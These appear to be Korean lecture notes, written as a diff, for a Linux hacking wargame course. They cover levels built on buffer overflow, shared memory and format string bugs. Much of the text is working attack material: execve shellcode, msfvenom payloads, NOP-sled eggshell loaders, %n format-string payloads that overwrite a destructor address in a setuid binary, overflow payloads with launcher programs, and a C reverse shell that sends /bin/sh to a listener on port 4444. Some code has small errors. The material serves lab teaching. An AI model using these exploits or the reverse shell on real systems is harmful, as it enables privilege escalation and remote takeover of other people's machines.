+			$ ls -l /usr/bin/bof						-> suid가 걸려있음 이렇게 걸려있는 프로그램은 breakpoint를 걸 수가 없음 read권한도 없어서 복사도 못함 그래서 힌트에서 소스코드를 제공한 것 그것으로 해보라고 
+			$ gdb bof
+				(gdb) disassemble main
+				(gdb) b *0x0804847d
+				(gdb) run
+					AAAAAAAAAABBBBBBgo
+						&buf=0xbffff8d0, &buf2=0xbffff8e0
+				(gdb) x/s 0xbffff8d0
+					0xbffff8d0:      "AAAAAAAAAABBBBBBgo\n"
+				(gdb) x/s 0xbffff8e0
+					0xbffff8e0:      "go\n"
+				(gdb) c
+					Continuing.
+					Good Skill!
+						id -> 권한상승x 이유는 원본코드가 아니라 분석을 위해 복사한것을 분석했기 때문에 
+			$ ps 
+			$  pstree 14429
+			$ exit
+				(gdb) quit
+			$ /usr/bin/bof 
+				AAAAAAAAAABBBBBBgo
+					$ my-pass 
+						interesting to hack!
+		
+		쉘 스크립트 통해 문자열 입력
+			$ (for i in `seq 1 16`; do printf "A"; done; printf "go" ; cat) | /usr/bin/bof 
+		
+		펄 스크립트를 통해 문자열 입력			
+			$ (perl -e 'print "A"x16, "go"'; cat) | /usr/bin/bof 
+					
+		파이썬 스크립트를 통해 문자열 입력
+			$ (python -c 'print "A"*16+"go"'; cat) | /usr/bin/bof 
+			
+			$ printf "AAAAAAAAAABBBBBB\x67\x6f\n" 	go를 영어로 하는데 go는 0x67인데 쉘에서 앞에 0은 의미가없다 따라서 x67 하지만 앞에 이스케이프 처리를 위해 \를 써준다.
+	
+	[실습] 공격용 프로그램 개발 
+		(핵미)
+			$ vi Attack_Bof.c
+				#include <stdio.h>
+				#include <stdlib.h>
+				#define VICTIM "/usr/bin/bof"
+
+				main()
+				{
+    				char cmd[100];
+    				sprintf(cmd,"(python -c 'print \"A\"*16+\"go\"'; cat) | %s", VICTIM);	-> spirntf는 안에들어간 내용을 string처리를 한다
+					system(cmd);
+				}
+
+10. Leve10 -> Leve11
+	목적 : 공유 메모리에 데이터를 읽고 쓰기 
+	
+	프로세스와 프로세스가 통신하는 방법
+		소켓 사용 ( server/client )
+		공유메모리 사용하는 방법 ( DB 프로그램 )	-> 같은 서버내에 있는 프로세스가 메시지를 주고 받을때 
+		파일을 사용하는 경우 -> 속도가 떨어짐 
+		DB 사용하는 경우 -> 원격지에서는 좋지만 속도가 파일과비슷하게 떨어짐
+		
+	보안적인 요소에서 공유메모리를 쓰고 있는 대표적인 경우
+		암호화/복호화 방식(핵심 : KEY)
+	
+	[실습] Level10 문제에 도전하기(Level10 -> Level11)
+		$ ls -l
+		$ cat hint 
+		$ ipcs 		-> 공유메모리 확인
+			------ Shared Memory Segments --------
+			key        shmid      owner      perms      bytes      nattch     status
+			0x00001d6a 0          root      666        1028       0
+		$ find / -user level11 -perm -4000 2>/dev/null
+		$ find / -type f -exec egrep -l /home/level10/program {} \; 2>/dev/null
+		$ cat /etc/rc.d/rc.local
+			# run level10
+			/home/level10/program/level10	-> 부팅할때 한번 실행되는것을 확인 
+		$ ps -ef | grep level
+		
+		[참고] 공유 메모리 관련 함수 
+			shmget()		: 공유메모리 생성 및 공유메모리 사용할 수 있는 함수 
+				형식 		: int shmget(key_t key, int size, int shmflg);
+					- key_t key  	: 공유 메모리를 읽기 위한 key 변수
+					- int size   		: 공유 메모리의 크기
+					- int shmflg 	: 공유 메모리 생성이나 사용 옵션을 지정               
+						- IPC_CREAT: 공유 메모리 생성               
+						- 0666      	: 공유 메모리 사용 권한
+					- return value  :
+						실패 : -1
+						성공 : -1 이외의 값 ( 공유 메모리 식별자 )
+					- example		
+						int shm_id;
+						shm_id = shmget((key_t)7530, 1024, IPC_CREAT|0666);
+						if (shm_id == -1 ) 실패;
+						else 성공;
+										  
+			shmat()		: 할당된 공유 메모리 공간을 다른 프로세스에서 사용할 수 있게 권한을 부여하는 함수 
+				형식		: void *shmat(int shmid, const void *shmaddr, int shmflg);
+					- int shmid           		: 공유 메모리를 생성할 때 만들어진 공유 메모리 ID
+					- const void *shmaddr 	: 공유 메모리가 할당된 주소
+					- int shmflg          		: 공유 메모리 사용 옵션을 지정                        
+						- SHM_RND 			: 공유 메모리 주소를 프로세스에 맞게 따로 할당                        
+						- SHM_RDONLY 		: 공유 메모리를 읽기 전용으로 설정
+					- return value 				:
+						실패 : (void *)-1 ;
+						성공 : 프로세스 공유 메모리 접근 주소
+					- example
+						int shm_id;
+						void *shm_addr=(void *)0;
+						shm_addr = shmat(shm_id, (void*)0, 0);
+						if(shm_add  == (void *)-1) 실패;
+						else 성공;
+													  
+			shmdt()		: 다른 프로세스에 연결된 공유 메모리 공간의 사용을 끝낸 후 연결을 끊는 것 
+				형식		: int shmdt(const void *shmaddr);
+					- const void *shmaddr : 공유 메모리가 할당된 주소
+					- return value 			 
+						실패 : -1
+						성공 : 0
+					- example
+						void *shm_addr = (void *)0;
+						shmdt(shm_addr);
+						if (shmdt(shm_addr) == -1) 실패;
+						else 성공;
+			
+			[실습] 공유 메모리 할당/프로세스에 attach/프로세스에 detach
+				shm.c 		: 공유메모리 할당, 프로세스attach, 메시지를 공유메모리에 기록
+				shmget.c		: 공유메모리 접근, 프로세스attach, 공유메모리의 메시지를 buffer에 복사 
+				$ vi tmp/sharemem.c
+					#include <sys/types.h>
+					#include <sys/shm.h>
+					#include <sys/ipc.h>
+					#include <stdio.h>
+					int main()
+					{
+    					int shm_id;
+    					void *shm_addr=(void *)0;
+    					shm_id = shmget((key_t)9000, 1024, IPC_CREAT|0666);
+    					if (shm_id == -1)
+    					{
+        					printf("Shared memory creation failed.\n");
+        					return -1;
+    					}
+    					shm_addr = shmat(shm_id, (void *)0, 0);
+    					if (shm_addr == (void *)-1)
+    					{
+        					printf("Shared memory attachement failed. \n");
+        					return -1;
+    					}
+    					strcpy(shm_addr, "Memory Testing Messages");
+    					if (shmdt(shm_addr)== -1)
+    					{
+        					printf("Shared memory detachment failed.");
+        					return -1;
+    					}
+    					return 0;
+					}
+				$ gcc -o shm sharedmem.c
+				$ ./shm
+				$ ipcs 
+					------ Shared Memory Segments --------
+					key       		 shmid      owner      perms      bytes      nattch     status
+					0x00001d6a  0    	       root   	   	 666        1028       0
+					0x00002328  98306      level10  	 666        1024       0
+				$ cp sharedmem.c shm.c
+				$ vi shm.c 
+					#include <sys/types.h>
+					#include <sys/shm.h>
+					#include <sys/ipc.h>
+					#include <stdio.h>
+					#include <string.h>
+					int main()
+					{
+						int shm_id;
+						void *shm_addr=(void *)0;
+						char buffer[1024];
+			
+						shm_id = shmget((key_t)9000, 1024, 0666);
+						if (shm_id == -1)
+						{
+							printf("Shared memory creation failed.\n");
+							return -1;
+						}
+						shm_addr = shmat(shm_id, (void *)0, 0);
+						if (shm_addr == (void *)-1)
+						{
+							printf("Shared memory attachement failed. \n");
+							return -1;
+						}
+						memcpy(buffer, shm_addr, 1024);
+						printf("%s\n", buffer);
+						if (shmdt(shm_addr)== -1)
+						{
+							printf("Shared memory detachment failed.");
+							return -1;
+						}
+						return 0;
+					}
+				$ gcc -o shm shm.c
+				$ ./shm
+		$ vi shm.c
+			#include <sys/types.h>
+			#include <sys/shm.h>
+			#include <sys/ipc.h>
+			#include <stdio.h>
+			#include <string.h>
+			
+			#define KEY_ID 7530
+			
+			int main()
+			{
+    			int shm_id;
+    			void *shm_addr=(void *)0;
+    			char buffer[1024];
+
+			    shm_id = shmget((key_t)KEY_ID, 1024, 0666);
+    			if (shm_id == -1)
+    			{
+        			printf("Shared memory creation failed.\n");
+        			return -1;
+    			}
+    			shm_addr = shmat(shm_id, (void *)0, 0);
+    			if (shm_addr == (void *)-1)
+    			{
+        			printf("Shared memory attachement failed. \n");
+        			return -1;
+    			}
+    			memcpy(buffer, shm_addr, 1024);
+    			printf("%s\n", buffer);
+    			if (shmdt(shm_addr)== -1)
+    			{
+        			printf("Shared memory detachment failed.");
+        			return -1;
+    			}
+    			return 0;
+			}
+		$ ./shm
+		
+	[실습] 리버싱을 통한 의사 코드 복원 
+		(핵미)
+			$ cd
+			$ su
+			$ cd program
+			$ ls -l
+			$ file level10
+			$ gdb level10
+				-> Level10.txt
+			$ vi level10.txt
+				#include <stdio.h>
+				#include <stdlib.h>
+				#include <unistd.h>
+				#include <string.h>
+				#include <sys/types.h>
+				#include <sys/ipc.h>
+				#include <sys/shm.h>
+
+				char *shm_dt;
+				int shm_id;
+				
+				main( ) 
+				{
+						shm_id = shmget((key_t)7530, 1028, 0666 | IPC_CREAT);
+        				shm_dt = shmat(shm_id, (void *)0, 0);
+						strcpy(shm_dt,"멍멍: level11의 패스워드는?\n구타: what!@#$?\n");
+				}
+	
+11. Leve11 -> Level12
+	목적 : 포맷스트링과 버퍼오버플로우 
+		
+	[실습] 포맷스트링 버그에 대해서 
+		$ ls -l
+		$ cd tmp
+		$ vi format.c
+			#include <stdio.h>
+			int main()
+			{
+    			int i, value[127];
+			    for(i=0; i<=127; i++)
+    			{
+        			value[i]=i;
+        			printf("Hex=0x%x, DEC=%d, OCT=%o, CHAR=%c\n", value[i], value[i], value[i], value[i]);
+    			}
+    			printf("\n");
+			}
+		$ gcc -o format format.c
+		$ ./format 
+		$ export LANG=C
+		$ man ascii
+		$ vi format2.c
+			#include <stdio.h>
+			int main(int argc, char *argv[])
+			{
+    			int a=10;
+    			char *RokHacker="i am RokHacker!";
+    			char *SuperUser="i am SuperUser!";
+			    printf(argv[1]);
+    			printf("\n");
+    			retrun 0;
+			}
+		$ gcc -mpreferred-stack-boundary=2 -o format2 format2.c	->스택의 경계(Boundary)가 2바이트 단위로 증가하게 된다.
+		$ ./format2 "AAAA" 
+		$ ./format2 %x 
+		$ ./format2 "%8x %8x %8x %8x %8x %8x %8x %8x"		-> 한 칸당 8칸으로 인식하고 오른쪽 정렬을 해준다.
+			일단 기본적으로 printf("%x") 하면 스택의 맨 위부터 출력을 해준다.
+		$ gdb -q format2 
+			disassembly main
+			b *첫번째printf의 주소 설정
+			run "%8x %8x %8x %8x %8x %8x %8x %8x"	-> 8칸씩 print("%x") 를해서 출력을 원한다.
+			x/9x $esp												-> 9개를 16진수로 esp값위에서부터 출력해준다.
+			[참고]
+			x/s 스트링보기
+			x/x 주소보기
+			x/d 십진수로 보기 
+		$ vi format3.c
+			#include <stdio.h>
+			#include <stdlib.h>
+
+			int main(int argc, char **argv)
+			{
+        			static int i=0;
+        			char str[127];
+			
+        			strcpy(str, argv[1]);
+        			printf(str);
+
+        			printf("\n i=%p, i=%d\n", &i, i);
+			
+        			return 0;
+			}
+		$ gcc -o format3 format3.c 
+		$ ./format3
+			-> segmentfault -> argv[1]값을 줘야하는데 안줘서 비정상 종료라는 뜻 
+		$ ./format3 "AAAA"
+			-> 이거는 문제가 없음 
+		$ ./format3 "%8x"
+			-> 스택의 가장 위에있는 값을 출력함 
+		$ ./format3 "AAAA %8x %8x %8x %8x %8x"
+			-> 입력한 AAAA 가 4번째에 41414141 로 표기되어있음 
+			ABCD bffffc26        0        0 44434241
+			i=0x804948c, i=0
+
+		[참고] %n 의 사용법	-> 이거는 소스코드를 바꿀수 있을때 사용하는 공격 
+			static int i=0;
+			int j=5;
+			printf("%10d%n", j. &i);
+				10크기의 공간을 할당해놓고 j가 5라서 10칸중 맨 마지막에 5가 표현되고 
+				%n은 앞에 10개의 공간이기 때문에 &i의 값이 10이 된다.
+		$ ./format3 $(printf "\x8c\x94\x04\x08")%8x%8x%8x%n
+			 i=0x804948c, i=28
+		$ ./format3 $(printf "\x8c\x94\x04\x08")%8x%8x%100x%n
+			 i=0x804948c, i=120
+		$ ./format3 $(printf "AAAABBBB\x84\x94\x04\x08")%8x%8x%8x%8x%76x%n			-> 위랑같은것
+		$. /format3 $(printf "AAAABBBB\x84\x94\x04\x08CCCC")%8x%8x%8x%8x%72x%n	-> 위랑같은것
+			
+	[실습] Level11 문제에 도전하기(Level11 -> Level12)
+		(핵미)
+			$ cd 
+			$ ls -l
+			$ cat hint 
+				#include <stdio.h>
+				#include <stdlib.h>
+				int main( int argc, char *argv[] )
+				{
+        				char str[256];				-> 버퍼오버플로우 버그 
+				        setreuid( 3092, 3092 );
+        				strcpy( str, argv[1] );
+        				printf( str );					-> 이게 잘못된 것임 포맷스트링버그
+				}
+			$ ./attackme
+				Segmentation fault
+			$ ./attackme "AAAA %x %x %x %x" 
+			$ ./attackme "AAAA %8x %8x %8x %8x" 
+				AAAA bffffc3d bfffed00        1 41414141
+			$ nm /home/level11/attackme	-> 심볼정보를 확인한다.
+				08049608 d __CTOR_END__	생성자
+				08049604 d __CTOR_LIST__
+				08049610 d __DTOR_END__	소멸자 
+			
+			[참고] 에그쉘
+				프로그램을 실행할때 환경변수에 쉘 코드를 올린다 환경변수 주소는 확인을 할 수 있음 벗 그냥 운영체제에서 쉘코드의 주소를 알려고하면 운영체제가 주인이기 때문에 알기가 힘들다
+			
+			* 순서 : 소멸자가 소멸하는 값에 주소를 넣고 해당 주소는 쉘코드를 생성하는 주소이다
+						첫번째로 쉘코드를 작성하고 메모리에 올려서 주소를 알아야하고 
+						소멸자의 주소를 알기때문에 해당 주소의 값을 쉘코드의 주소로 바꾸고 공격한다.
+			
+			[참고] 쉘코드 만드는 방법
+				(핵미) 
+					$ cd tmp
+					$ export LANG=C
+					$ man execve
+					$ vi myshell.c
+						#include <unistd.h>
+						#include <stdio.h>
+						int main()
+						{
+        						char *bash[] = {"/bin/sh", 0};
+        						/* bash[0] => /bin/sh
+                						bash[1] => \0   */
+        						execve(bash[0], &bash, 0);
+        						/* bash[0] => /bin/sh
+                						&bash == &bash[0]
+                						0 == \0  */
+						return 0;
+						}
+					$ ./myshell
+						$ ps
+					$ cat /usr/include/asm/unistd.h | head -20
+					$ vi myshell.s
+						.global _start
+						_start:
+						xor %eax, %eax			-> eax레지스터 0으로 초기화 
+						xor %edx, %edx			-> edx레지스터 0으로 초기화 
+						push %eax					-> null
+						push $0x68732f2f 		-> //sh 문자열임 : 68은 push 2f2f7368 -> 아스키로 //sh임 
+						push $0x6e69622f		-> /bin 문자열임 
+						mov %esp, %ebx			-> ebx 에 esp를 넣는다 esp는 /bin을 가지고있다 execve는 첫번째 인자로 실행할 명령어를 가지고 있어야 하기 때문에 
+						push %edx					-> null 
+						push %ebx					-> ebx값을 넣는다 ebx는 /bin/sh의 주소 
+						mov %esp, %ecx			-> /bin/sh의 주소의 주소
+						movb $0x0B, %al		-> 0B가 11번 인데 이는 execve함수를 말함 
+						int $0x80					-> 인터럽트임 
+						
+						[참고] /bin/sh & /bin//sh 차이 
+							어셈블리어 문자열 처리는 4바이트 단위 
+							하지만 /bin/sh는 7바이트 문자열 
+							따라서/bin//sh를 이용해 8바이트로 만듬 
+							결론 : 똑같은것 
+					
+					$ man as
+					$ man ld 
+					$ as myshell.s -o myshell.o	-> 어셈블리로 목적 파일을 만듬 s파일을 101010으로 만들어줌 그러나 헤더파일을 참조해야한다.
+					$ ld myshell.o -o myshell		-> 링크를 걸때 사용하는 것으로 execve를 사용(unistd.h) 하기 때문에 해당 헤더파일을 링크해주고 myshell을 만듬
+					$ ./myshell
+					$ objdump -d ./myshell		-> opcode를 추출한다
+					$ vi myshellex.c 
+						#include <stdio.h>
+						char shellcode[] =
+						"\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
+						"\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
+						
+						int main()
+						{
+							printf("Size: %d bytes\n", strlen(shellcode));
+							(*(void (*)()) shellcode)();
+						}
+					$ $ gcc -o myshellex myshellex.c
+					$ ./myshellex
+				
+				(칼리)
+					# msfvenom -h 
+					# msfvenom -l payload
+					# msfvenom -l payload | egrep 'linux/x64/exec'
+					# msfvenom -p linux/x64/exec --list-options
+					# msfpayload linux/x86/exec CMD=/bin/ls C > myshellcode.c
+					# cat myshellcode.c
+						unsigned char buf[] = 
+						"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
+						"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f"
+						"\x62\x69\x6e\x2f\x6c\x73\x00\x57\x53\x89\xe1\xcd\x80";
+					# vi shell.c 
+						#include <stdio.h>
+						unsigned char shellcode[] = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
+						"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f"
+						"\x62\x69\x6e\x2f\x6c\x73\x00\x57\x53\x89\xe1\xcd\x80";
+						int main()
+						{
+        						int (*shell)();
+        						shell=(int (*)()) shellcode;
+        						(int)(*shell)();
+        						return 0;
+						}
+					# gcc -fno-stack-protector -z execstack -o shell shell.c 	-> 칼리는 스택을 스스로 보호해서 실습을 위해서 옵션을 줘서 스택가드를 풀어준다.
+					# ./shell
+					
+					# msfvenom -p linux/x64/exec CMD=/usr/bin/cal -f c > myshellcode.c
+					# cat myshellcode.c 
+					# vi shell.c
+						unsigned char buf[] = 
+						"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
+						"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x0d\x00"
+						"\x00\x00\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x63\x61\x6c\x00"
+						"\x56\x57\x48\x89\xe6\x0f\x05";
+						int main()
+						{
+        						int (*shell)();
+        						shell=(int (*)()) buf;
+        						(int)(*shell)();
+        						return 0;
+						}
+					# gcc -fno-stack-protector -z execstack -o shell shell.c
+					# ./shell
+				
+				(칼리)
+					# which nc 
+					# nc -l -vv -p 4444 
+				(핵미)
+					# telnet root@192.168.10.240 
+					# export TERM=xterm 
+					# clear 
+					# mkdir -p /root/bin
+					# cd /root/bin 
+					# vi myreverse.c 
+						#include <sys/socket.h>
+						#include <netinet/in.h>
+						#include <netdb.h>
+						#include <unistd.h>
+						#include <errno.h>
+						int main()
+						{
+							struct sockaddr_in serveraddr;
+							int server_sockfd;
+							int client_len;
+							char buf[80];
+							char rbuf[80];
+							char *cmdBuf[2] = { "/bin/sh", (char *)0};
+						
+							server_sockfd = socket(AF_INET, SOCK_STREAM, 6);
+							serveraddr.sin_family = AF_INET;
+							serveraddr.sin_addr.s_addr = inet_addr("192.168.10.50");
+							serveraddr.sin_port = htons(atoi("4444"));
+							client_len = sizeof(serveraddr);
+							
+							connect(server_sockfd, (struct sockaddr *)&serveraddr, client_len);
+							
+							dup2(server_sockfd, 0);
+							dup2(server_sockfd, 1);
+							dup2(server_sockfd, 3);	
+							
+							execve("/bin/sh", cmdBuf, 0);
+						
+							return 0;
+						}
+					# gcc -o myreverse myreverse.c
+					# ./myreverse
+				(칼리)
+					id
+					pwd
+					exit 
+				(핵미)
+					dup2(server_sockfd, 0);	부분 주석처리 
+				(칼리)
+					id
+					ls	
+					exit			-> 명령어 인식이 안된다 입력이 복사가 안되기 때문에 위에 0은 fd값의 0 입력이다 
+				(핵미)
+					ls				-> 출력이 안나온다 이유는 위에서 1과 2는 즉 출력과 에러는 칼리에게 복사하기때문에 칼리에서 표시가 나온다 
+				(핵미)
+					dup2(server_sockfd, 1);	부분 주석처리 
+				(칼리)
+					id				-> 출력이 안나옴 이유는 위에서 1은 주석처리해서 정상출력결과가 핵미에서 나오는것을 확인할 수 있음 에러만 칼리에서 나옴 
+				(핵미)
+					주석처리를 다 제거한다.
+					# gcc -S -o myreverse.asm myreverse.c	-S옵션으로 어셈블리어로 컴파일이 됨 
+					# objdump -d ./myreverse 
+			
+			$ vi tmp/egg.c
+				#include <stdio.h>
+				#include <stdlib.h>
+				#include <unistd.h>
+				
+				#define DEFAULT_OFFSET 0
+				#define DEFAULT_ADDR_SIZE 8
+				#define DEFAULT_BUFFER_SIZE 512
+				#define DEFAULT_SUPERDK_SIZE 2048
+				#define NOP 0x90
+				
+				char shellcode[] =
+ 				"\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+ 				"\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";
+
+				unsigned long get_sp(void)
+				{
+        				__asm__("movl %esp, %eax");
+				}
+				int main(int argc, char **argv)
+				{
+        				char *ptr, *superSH;
+        				char shAddr[DEFAULT_ADDR_SIZE + 1];
+        				char cmdBuf[DEFAULT_BUFFER_SIZE];
+        				long *addr_ptr,addr;
+        				int offset=DEFAULT_OFFSET;
+        				int i, supershLen=DEFAULT_SUPERDK_SIZE;
+        				int chgDec[3];
+				      
+        				if(!(superSH = malloc(supershLen)))
+        				{
+                				printf("Can't allocate memory for supershLen");
+                				exit(0);
+        				}
+				        
+        				addr = get_sp() - offset;
+        				printf("Using address: 0x%x\n", addr);
+				     
+        				ptr = superSH;
+        				for(i=0; i<supershLen - strlen(shellcode) - 1; i++)
+                				*(ptr++) = NOP;
+				        
+        				for(i=0; i<strlen(shellcode); i++)
+                				*(ptr++) = shellcode[i];
+				        
+        				superSH[supershLen - 1] = '\0';
+				        
+        				memcpy(superSH, "SUPERDK=", DEFAULT_ADDR_SIZE);
+        				putenv(superSH);
+				        
+        				system("/bin/bash");
+				}
+			$ gcc -o egg egg.c
+			$ ./egg
+				-> 에그쉘 코드를 컴파일해서 실행해 보면 환경변수에 올라간 쉘코드의 주소가 보인다. but 해당 주소가 정확하지 않음 
+			$ ps 
+			$ ps -l
+			$ pstree 3451
+				egg 밑에 쉘 밑에 실행되는것을 확인
+			$ set 
+				하면 위에서 선언한 SUPERDK= 가 있고 해당 안에는 거의다 NOP문이고 뒤에 조금 앞에서 선언한 쉘코드가 있다 
+				해당 위에서 나온 주소를 써도 실행확률이 있지만 우리 수업에서는 더 정확하게 주소를 찾아보기로 한다 
+			$ vi getenv.c		환경변수를 보기위한 코드 작성 
+				#include <stdio.h>
+				int main()
+				{
+    				printf("SUPERDK's addr=%p\n", getenv("SUPERDK"));
+				}
+			$ gcc -o getenv getenv.c
+			$ ./getenv
+				SUPERDK's addr=0xbffff4a1		-> 여기서 나온 주소가 정확한 주소임 지금 떠있는 상태에서 주소를 가져왔기 때문에 
+			$ /home/level11/attackme $(printf "\x10\x96\x04\x08\x10\x96\x04\x08\x12\x96\x04\x08\x12\x96\x04\x08")%8x%8x%8x%62585c%n%52062c%n
+				-> id 하면 level12임
+			$ vi egg2.c
+				#include <stdio.h>
+				#include <stdlib.h>
+				#include <unistd.h>
+				#define NOP 0x90
+				char shellcode[] =
+ 				"\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+ 				"\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";
+
+				int main(int argc, char **argv)
+				{
+        				char *ptr, *superSH;
+        				int supershLen=2048;
+        				int i;
+				        if(!(superSH = malloc(supershLen)))
+        				{
+                				printf("Can't allocate memory for supershLen");
+                				exit(0);
+        				}
+				
+        				ptr = superSH;
+        				for(i=0; i<supershLen - strlen(shellcode) - 1; i++)
+                				*(ptr++) = NOP;
+				
+        				for(i=0; i<strlen(shellcode); i++)
+                				*(ptr++) = shellcode[i];
+				
+        				superSH[supershLen - 1] = '\0';
+				
+        				memcpy(superSH, "SUPERDK=", 8);
+        				putenv(superSH);
+				
+        				system("/bin/bash");
+				}
+			$ gcc -o egg2 egg2.c
+			$ ./egg2
+			$ ps 
+			$ set 
+			$ ./getenv
+				SUPERDK's addr=0xbffff4a1
+			$ /home/level11/attackme $(printf "AAAA\x10\x96\x04\x08BBBB\x12\x96\x04\x08")%8x%8x%8x%62585c%n%52062c%n
+		
+12. Level12 -> Level13
+	1. 목적 : 버퍼오버플로우에 대해서 
+		(핵미)
+			$ vi tmp/cmd.c
+				main(void)
+				{
+					char str[256];
+				
+					printf("Enter string : ");
+					gets(str);
+					printf("%s\n", str);
+				}
+			$ gcc -o cmd cmd.c
+			$ ./cmd
+				AAAA
+			$ gdb -q cmd 
+				disassemble main	-> 264바이트로 할당됨
+										-> 우리가 준 버퍼는 256 따라서 총 8바이트의 더미공간이 생김
+										-> 이후 우리는 할당받은 265 을 A로 넣는다 
+			$ perl -e 'print "A"x256' | ./cmd
+			$ perl -e 'print "A"x264' | ./cmd
+			$ perl -e 'print "A"x268' | ./cmd		-> sfp 까지 넘치고 엔터까지 해서 리턴주소가 넘침 따라서 세그먼트폴트가 발생됨 
+			$ perl -e 'print "A"x272' | ./cmd		-> 리턴 까지 넘친것 따라서 세그먼트폴트가 발생됨 
+			
+	[실습] Level12 문제에 도전하기 
+		(핵미)
+			$ cat hint
+			$ ./attackme
+				AAAA
+			$ ./attackme
+				%s%s%s%s	-> 포맷스트링 버그는 없다.
+			$ cp attackme tmp/
+			$ gdb -q attackme
+				disassemble main
+					break 를 맨 뒤에 printf 문에 건다 이후 입력
+						AAAAAAAA
+					x/72x $esp		-> AAAAA를입력한 후에 값을 보기위해 연다
+			$ (perl -e 'print "\x41"x264') | /home/level12/attackme
+			$ (perl -e 'print "\x41"x268') | /home/level12/attackme
+				세그먼트 폴트
+			$ (perl -e 'print "\x41"x267') | /home/level12/attackme
+			$ gdb -q attackme
+				disassemble main
+					break 를 맨 뒤에 printf 문에 건다 이후 입력
+						r
+							AAAA
+								x/72x $esp
+									c
+						r
+							A 256개
+								x/72x $esp
+									c
+						r
+							A 264개
+								x/72x $esp
+									c			
+						r
+							A 268개
+								x/72x $esp
+									c			
+						r
+							A 272개
+								x/72x $esp
+									c			
+										bt
+			$ vi tmp/egg.c
+				#include <stdio.h>
+				#include <stdlib.h>
+
+				#define DEFAULT_OFFSET 0
+				#define DEFAULT_BUFFER_SIZE 512
+				#define DEFAULT_EGG_SIZE 2048
+				#define NOP 0x90
+
+				char shellcode[] =
+				"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+				"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+				"\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+				unsigned long get_esp(void) {
+				                __asm__("movl %esp, %eax");
+				}
+
+				int main(int argc, char *argv[])
+				{
+				
+        				char *buff, *ptr, *egg;
+        				long *addr_ptr, addr;
+        				int offset=DEFAULT_OFFSET;
+        				int bsize=DEFAULT_BUFFER_SIZE;
+				
+        				int i, eggsize=DEFAULT_EGG_SIZE;
+				
+        				if (argc > 1) bsize = atoi(argv[1]);
+        				if (argc > 2) offset = atoi(argv[2]);
+        				if (argc > 3) eggsize = atoi(argv[3]);
+
+				        if (!(buff = malloc(bsize)))
+        				{
+				                        printf("Can't allocate memory.\n");
+                                				exit(0);
+        				}
+        				if (!(egg = malloc(eggsize)))
+        				{
+				                        printf("Can't allocate memory.\n");
+                                				exit(0);
+        				}
+        				addr = get_esp() - offset;
+        				printf("Using address: 0x%x\n", addr);
+				
+        				ptr = buff;
+        				addr_ptr = (long *)ptr;
+        				for(i=0; i<eggsize - strlen(shellcode) -1; i++)
+				                        *(ptr++) = NOP;
+        				for(i=0; i<strlen(shellcode); i++)
+				                        *(ptr++) = shellcode[i];
+				
+        				buff[bsize - 1] = '\0';
+        				egg[eggsize -1] = '\0';
+        				memcpy(egg, "EGG=", 4);
+        				putenv(egg);
+        				putenv(buff);
+        				system("/bin/sh");
+				}
+			$ gcc -o egg egg.c
+			$ ./egg 459
+				$ set
+				$ vi getenv.c
+					#include<stdlib.h>
+					main() {
+    					printf("EGG : %p", getenv("EGG"));
+					}
+				$ gcc -o getenv getenv.c
+				$ ./getenv.c
+				$ (python -c 'print "A"*268 + "\xb8\xfa\xff\xbf"';cat)| /home/level12/attackme
+	
+	[실습] 공격용 프로그램 개발
+		1. 쉘코드의 정의	-> egg
+		2. 쉘코드의 주소	-> getenv
+		3. 공격 				-> Attack_bof
+			$ vi Attack_bof.c
+				#include <stdio.h>
+				#include <stdlib.h>
+
+				#define NOP 0x90
+				#define BUFSIZE 272
+				
+				char shellcode[] =
+				"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+				"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+				"\x80\xe8\xdc\xff\xff\xff/bin/sh"
+				"\xb8\xfa\xff\xbf";
+
+				int main()
+				{
+				char shellBuf[BUFSIZE], cmdBuf[320];
+				int i, j, shellLen;
+
+				shellLen=strlen(shellcode);
+				for(i=0; i<sizeof(shellBuf)-shellLen; i++)
+    				shellBuf[i] = NOP;
+				for(j=0; j<shellLen; j++)
+    				shellBuf[i++] = shellcode[j];
+				
+				sprintf(cmdBuf, "(perl -e \'print \"");
+				strcat(cmdBuf, shellBuf);
+				strcat(cmdBuf, "\"\'; cat) | /home/level12/attackme");
+				strcat(cmdBuf, "\x0a");
+				system(cmdBuf);
+				}
+			$ vi egg2.c
+				#include <stdio.h>
+				#include <stdlib.h>
+				#include <unistd.h>
+
+				#define NOP 0x90
+
+				char shellcode[] =
+ 				"\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+ 				"\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";
+
+				int main(int argc, char **argv)
+				{
+        				char *ptr, *superSH;
+        				int supershLen=2048;
+        				int i;
+
+				        if(!(superSH = malloc(supershLen)))
+        				{
+                				printf("Can't allocate memory for supershLen");
+                				exit(0);
+        				}
+				
+        				ptr = superSH;
+        				for(i=0; i<supershLen - strlen(shellcode) - 1; i++)
+                				*(ptr++) = NOP;
+				
+        				for(i=0; i<strlen(shellcode); i++)
+                				*(ptr++) = shellcode[i];
+				
